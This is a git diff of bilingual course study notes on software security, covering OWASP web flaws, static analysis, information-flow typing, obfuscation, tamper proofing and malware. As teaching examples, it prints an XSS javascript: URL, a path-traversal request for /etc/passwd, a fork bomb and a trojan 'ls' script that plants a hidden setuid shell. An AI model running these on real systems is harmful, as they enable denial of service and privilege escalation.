@@ -492,7 +492,7 @@ Coders: expert in
 - Build systems, overnight testing 测试流水线
 
 ## Web Application Security
-OWASP Top 10
+OWASP Top 10: CVSS scores
 Exploits and vulnerabilities would appear at any level of tech stack
 
 Knowing what is happening at the bottom of the stack is important to  
@@ -503,14 +503,17 @@ understand fundamentally how web security provisions work
 Client != Browser
 ![](../img/Pasted%20image%2020251023194807.png)
 
-`Referer: http://www.ed.ac.uk/loggedin`
+Failed trust: `Referer: http://www.ed.ac.uk/loggedin`
 ![](../img/Pasted%20image%2020251023195114.png)
 
 Get and POST
 ![](../img/Pasted%20image%2020251023195448.png)
 
 RFC 3986
+scheme://login:password@address:port/path?query#fragment
 ![](../img/Pasted%20image%2020251028201728.png)
+- Homograph attack
+- Typo-squatting attack
 
 ```
 javascript://expmple.com/%0alert(1)
@@ -527,6 +530,7 @@ http://researchsite.ed.ac.uk/showhtml.php?title=User+Manual&file=%2Fetc%25passwd
 - PHP code didnt check the filename returned
 - Should only allow access to its own recouces
 
+Revalidate
 Data indirection: index or hash table using for eliminate direct chosen data/file access
 
 Hidden input of the server: To prevent *client-side tampering*, a *MAC* (Message Authenticate Code) constructed with a **server-side secret key**, validate after form submission (return to the server)
@@ -538,9 +542,9 @@ Other mistakes:
 *Authorization by obscurity*
 - a web page is not linked to the main site, assuming that only people who are given it (know it in advance) will be able to reach it
 
-#### Function access
+#### Function-level access
 Much more dangerous
-- Hiding nevigation (admin) links to unauthorized sections
+- Hiding navigation (admin) links to unauthorized sections
 - wrongly assuming this prevents non-authorized users visiting them
 
 Well-specified polity
@@ -578,6 +582,7 @@ Solutions
 
 ### Cookies and Sessions
 ![](../img/Pasted%20image%2020251030202942.png)
+Transmit by HTTP headers, and have a limited lifetime
 
 #### Session hijacking
 Many web apps use session IDs as a credential
@@ -621,20 +626,21 @@ http://geemail.com/send_email.htm?to=bob%40example.com
 ```
 
 use a good framework that provides built-in protections
-- not use GET
-- double cookie, repeated in POST
+- not use GET for any sensitive state change
+- double cookie, repeated in POST 同时放hidden表单和cookie，双检查
 - special CSRF token, check in server side, save state
 - browser sandboxing
+- Same Origin Policy restricts client-side code
 
 *CORS: Cross-Origin Resource Sharing*
-Uses new HTTP headers from server to allow responses to indicate violations of same-origin
+Uses new HTTP headers from server to allow responses to indicate violations of same-origin  `Access-Control-Allow-Origin` 声明允许的跨域源
 
-#### Unvalidaated Redirects
+#### Unvalidated Redirects
 phishing
 
 - do not use redirects at all
 - use them but only with hard wired URLS
-- if user-supplied parameters must be used, indirection
+- if user-supplied parameters must be used, indirection and validation
 
 #### XML External Entities
 Web applications process XML documents which can contain external  
@@ -649,7 +655,7 @@ payloads:
 - 凭证/密钥泄露
 - 反序列化
 
-restrictive and specific formats for exchanging data, configure DTD and XML to vslidate documents, security checks
+Restrictive and specific formats for exchanging data, configure DTD and XML to validate documents, security checks, prevent external processing
 
 Nasty attacks
 ```
@@ -663,11 +669,13 @@ Nasty attacks
 A billion laughs
 
 #### Insecure Deserialization
+`unserialize(string $data, array $options = [])`: options can specify a maximum depth of deserialization 
 
 ## Code review and Architectural Analysis
 ![](../img/Pasted%20image%2020251104204532.png)
 
 ![](../img/Pasted%20image%2020251104223142.png)
+![](../img/Pasted%20image%2020251216080123.png)
 
 Weaknesses classify Vulnerabilities
 ![](../img/Pasted%20image%2020251104204735.png)
@@ -675,11 +683,12 @@ https://cwe.mitre.org/data/pdfs.html
 
 ### Static analysis
 White box technique: source code/binary code
-- assurrance of good behaviour
-- evidence of bad behaviour
+- assurance of good behaviour
+- evidence of bad behaviour, proposed fixes
 
 it examines every code path, and  
 it considers every possible input
+often finds root cause of a problem, can run before code complete
 ![](../img/Pasted%20image%2020251104205311.png)
 
 False negative problem
@@ -690,18 +699,23 @@ False negative problem
 - 配置/规则不足
 - 性能/工程权衡
 
+Soundy: capture all possible behaviours within reason 一个可证明正确的核心
+Unsound: analysis deliberately ignores program behaviours
+
+Proves the presence of bugs: some may be missed
+
 One missed bug enough for an attacker to get in!
 
 #### Style checking
-save practice
+save practice: warnings from compilers
 
 #### Type checking
 possible value check
 variable memory length check
 
-*Gradual typing*
+*Gradual typing* language
 - infer types in parts of code where possible
-- manually add type annotatoins elsewhere
+- manually add type annotations elsewhere
 - TypeScript
 
 Type systems: modularity
@@ -712,16 +726,18 @@ MATE
 
 #### Program understanding
 Tools:
-- Navigation
-- Refactoring
-- Inferring design
+- Navigation swiftly
+- Refactoring operations
+- Inferring design from code
 
 structure101
 Jujaba and Reclipse
 ![](../img/Pasted%20image%2020251106203757.png)
 
 **Model based testing**
-
+对系统的精确模型（来自设计或代码提取）进行测试或静态检查安全性质
+- Alloy
+- theorem provers, SMT solvers
 
 
 #### Program Verification & Property checking
@@ -729,27 +745,29 @@ Gold standard, formal specification
 - theorem proving
 - model checking
 
-Lightweight formal methods: make specifications be standard and generic
+Lightweight formal methods: **make specifications be standard and generic**
 Static checking
 
-*Assertion checking*: dynamic runtime checks, to test properties teh programmer expects to be true
+*Assertion checking*: dynamic runtime checks, to test properties the programmer expects to be true 断言检查
 assertion tests usually disabled
 
 *Contracts* 
-use explicit pre- and post-conditions supplied by teh programmer when developing code
+use explicit pre- and post-conditions supplied by the programmer when developing code
 
 *Design by Contract (TM)* aims to build a system as a set of components whose interaction is governed by mutual obligations, or contracts.
-*Hoare triple*$$\{P\}C\{Q\}$$where C is a program command, P is aa pre-condition and Q is a post-condition
+Effel OOP*Hoare triple*$$\{P\}C\{Q\}$$where C is a program command, P is aa pre-condition and Q is a post-condition
 
-*Effel*: besides pre and post conditions, class invatiants which must be established when an object is created and maintained whenever it is modified
+besides pre and post conditions, class invatiants which must be established when an object is created and maintained whenever it is modified
 
 *Defensive programming*: adds checks to code to ensure that pre-conditions are met
 
-`strncat(dest, src, num)`, throus warnings when preconditions `maxRead()` and `maxSet()` are not set
+`strncat(dest, src, num)`, throws warnings when preconditions `maxRead()` and `maxSet()` are not set
 
 *Bound/range Analysis*
 - `alloc_size(dest) > strlen(src)`
 - `array_size(a) > n` before a\[n\]access
+
+*Tainted data analysis*
 
 *Type State (resource) Tracking*
 isnull(ptr), nonull(ptr)  
@@ -759,8 +777,10 @@ uninitialized(buffer), terminatedstring(buffer)
 avoiding double-free errors
 ![](../img/Pasted%20image%2020251111202237.png)
 
+难点：大型项目的路径爆炸：分支和循环
 Null pointers
 #### bug finding
+Tools: look for suspicious patterns in code
 severity
 confidence
 
@@ -770,48 +790,57 @@ anti-idiom: double-checked locking in Java
 ### Language-based security approach
 
 CIA triple:
-- Confidentiality
-- Ingetrity
+- Confidentiality: cannot be learned by unauthorised principals
+- Integrity
 - Availability
 
 > Information is confidential if it cannot be learned by unauthorised principals.
 
 Browser: *Single Origin Policy* (SOP): web page elements must come from same domain, else block/warn, too restrictive
-- CSP
-- CORS
+- CSP: Content Security Policy
+- CORS: Cross-Origin Resource Sharing
 - SameSite attribute cookies
 
+Prevent application-level attacks inside the application: semantics-based security specification
+
 ### Taint tracking
+Tainted
 - Data from taint sources
 - Data arising from or influenced by tainted data
+Untainted
+- Data that is safe to output or use in sensitive ways
+
+![](../img/Pasted%20image%2020251216091452.png)
+Preventing jumps to tainted address
+![](../img/Pasted%20image%2020251216091549.png)
 
 sanitization
 
 Dynamic taint analysis
-
+not let thieves in my house in the first place
 > Preventing code injection exploits using dynamic taint tracking is like letting a thief in your house and checking his bag for stolen goods at the very moment he tries to leave. It might work, but only if you never lose track of the gangster and if you really know your house. However, I would prefer a solution that does not let thieves in my house in the first place.
 
 ### Type-checking
-
-security level
-- high: sensitive information
+Security levels
+- high: sensitive information: personal details
 	- computed directly from high data
 	- occurs in a high context
 - low: public information
 
 Static guarantee
-> Theorem: Typability implies no insecure flows 
+> Theorem: Typeability implies no insecure flows 
 > If an output expression has type low, then it cannot be affected by any input of type high. Hence there can be no insecure information flows in the program.
 
-For any two executions of the program which differ only in high  
-inputs, the result of low outputs does not change.
+For any two executions of the program which differ only in high inputs, the result of low outputs does not change.
 
 Preventing jumps to tainted addresses
 - implicit flows
 
+如果机密数据h的变化导致了l看到不一样的输出，说明数据泄露
 ![](../img/Pasted%20image%2020251111214010.png)
 
 basic rules
+pc: program counter context 当前代码环境的安全级别
 ![](../img/Pasted%20image%2020251111214036.png)
 
 compound rules
@@ -822,6 +851,14 @@ compound rules
 ![](../img/Pasted%20image%2020251111205613.png)
 
 ## Software Protection
+### MATE and R-MATE
+*Man-At-The-End* attacks: An adversary has physical access to a device and compromises it by inspecting, reverse engineering or tampering with its hardware or software 对设备有访问权限，可以逆向，修改
+- license check removal
+- code lifting: obfuscation
+
+*Remote MATE*: In distributed systems where untrusted clients communicate with trusted clients communicate with trusted servers, a malicious user gets an advantage by compromising an untrusted device 篡改客户端逻辑盗取信息
+- replay-resilient 抗重放攻击
+- remote attestation 远程证明，远程代码是否可信
 
 ### Code signing
 ![](../img/Pasted%20image%2020251113202700.png)
@@ -830,7 +867,7 @@ compound rules
 - Aims to protect recipient from unsafe code: malware
 
 
-### Program objuscation
+### Program obfuscation
 ```c
 char O,o[];main(l){for(;~l;O||puts(o))O=(O[o]=  
 ~(l=getchar())?4<(4ˆl>>5)?l:46:0)?-~O&printf("%02x ",l)*5:!O;}
@@ -839,17 +876,17 @@ Obfuscating compiler
 functionally equivalent program
 ![](../img/Pasted%20image%2020251113203453.png)
 
-*Black box simulator* $S^P$ of P can onlu observe the input-output behaviour of P, nothing about its code or timing
-Secure Virtual Black-box" 分析混淆代码并不会带来额外知识或洞察
+*Black box simulator* $S^P$ of P can only observe the input-output behaviour of P, nothing about its code or timing
+Secure Virtual Black-box  分析混淆代码并不会带来额外知识或洞察
 
 Derived: cryptographic primitives
-- **Symmetric to Asymmetric crypto**: An obfuscated symmetric encrypt function $C(E_k)$ with a key `k`, thus anyone can encrypt but only the owner who knows `k` can decrypt
-- **Homomorphic encryption**: Homomorphic encryption allows general computation on encrypted data. For any boolean operation f, the plain program P computes $E_k(f(D_k(x)))$. Its obfuscated version $C(P_k)$ hides the key K and encryption method.
+- **Symmetric to Asymmetric crypto**: An obfuscated symmetric encrypt function $C(E_k)$ with a key `k`, thus anyone can encrypt but only the owner who knows `k` can decrypt  混淆加密函数，用sk解密
+- **Homomorphic encryption**: Homomorphic encryption allows general computation on encrypted data. For any boolean operation f, the plain program P computes $E_k(f(D_k(x)))$. Its obfuscated version $C(P_k)$ hides the key K and encryption method.  
 
 > It is impossible to construct an obfuscating compiler that satistfies virtual black box security.
 - counterexample
 
-### Tamperproofing
+### Tamper proofing
 **Check**, to see if tampering has occurred
 - code checking
 - result checking
@@ -862,9 +899,9 @@ Derived: cryptographic primitives
 - report
 - punish: destroy program, data or environment
 
-> One technique is to to use multiple hashing methods and compute multiple hashes on fragments of code. 
-> Then spread the hash computation repeatedly throughout the code. 
-> To help prevent attackers figuring out the scheme, tamperproofing is combined with obfuscation.
+Pervasive Hashing
+> To use multiple hashing methods and compute multiple hashes on fragments of code. Then spread the hash verification repeatedly throughout the code. 
+> To help prevent attackers figuring out the scheme, tamper proofing is combined with obfuscation.
 
 ### Watermarking
 ![](../img/Pasted%20image%2020251113204748.png)
@@ -872,3 +909,81 @@ Program $P_w=embed_k(P,w)$
 - should be recoverable with a secret key k
 - should be robust
 - high credibility
+
+- track author/purchaser
+- record rights
+- integrity
+
+## Malware
+Weaponized: packaging, delivery, execution, attack methods, vulnerability exploits
+
+Defences: analysis & prevention, detection, response
+
+Fork bomb
+`:(){ :|:& };:`
+
+```sh
+#!/bin/sh
+#
+cp /bin/sh /tmp/.xxsh
+chmod o+s,w+x /tmp/.xxsh
+ls $*
+rm ./ls
+```
+
+- *Virus*: tries to replicate itself into other executable code, infected
+- *Worm*: runs independently and can propagate a complete working version of itself onto other hosts on a network, usually by exploiting software vulnerabilities
+- *Torjan Horse*: appears to have a useful function, but also has a hidden malicious function
+- *Rootkit*: a Torjan embedded into the OS, often altering system commands and adding backdoors
+- *Mobile (Code) Malware*: transmitted from remote to local host where executed, maybe without consent
+
+*Potentially Unwanted Programs (PUPs)*: generalises adware, spyware. Idea by industry: malware that is usually deliberately installed (main function desired by user) and “less damaging” than other types.  附带不受欢迎的行为
+*Potentially Harmful Application*: encompasses all kinds of malware, including software that damages ecosystem generally.
+*Potentially Unsafe Application*: legitimate applications that might be unsafe “in the wrong hands”, e.g., remote access tools, password-crackers applications, and keyloggers
+
+Specific violation of a target’s security policy
+![](../img/Pasted%20image%2020251216102252.png)
+
+MITRE’s Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) record using TTP
+- Tactics: short-term tactical adversary goals
+- Techniques: to achieve tactical goals
+- Procedure: detail of processes
+![](../img/Pasted%20image%2020251216102520.png)
+
+### Analysis
+1. Collect malware samples
+2. Identify code formats (pattern) involved
+3. Disassembly, static analysis
+4. Dynamic analysis: sandbox
+
+fuzzing: trigger malware behaviour
+Symbolic and concolic execution: explore code behaviours
+
+Countermeasure 攻方反制
+- Obfuscation: Polymorphism self-mutate, packaging
+- Fingerprinting: detect it is running in an analysis environment
+
+### Detection
+![](../img/Pasted%20image%2020251216103108.png)
+- During download: Intrusion Detection Systems
+- After download: Antivirus/host-based IDS
+- During execution: security tools, traffic/memory monitoring, sandbox
+
+Countermeasure 攻方反制：多样化 自修改 Diversification
+- Polymorphism
+- Metamorphism: 动态更新
+
+### Response
+Isolation, recovery, forensics, remediation
+隔离，恢复，取证，修复
+
+Takedowns 扰乱行动本身
+
+Countermeasures
+- **Fast-flux 域名轮换 / DGA**：生成伪随机域名序列，快速变更 DNS 指向。
+- **Bullet-proof hosting**：无视投诉/下架请求的托管服务。
+- **多备份服务器 / 备份 P2P 通道**：中心化不可用就切换。
+
+**Identify actors behind attacks**
+Source code: programming style
+Connectivity: known associations in DNS, emails
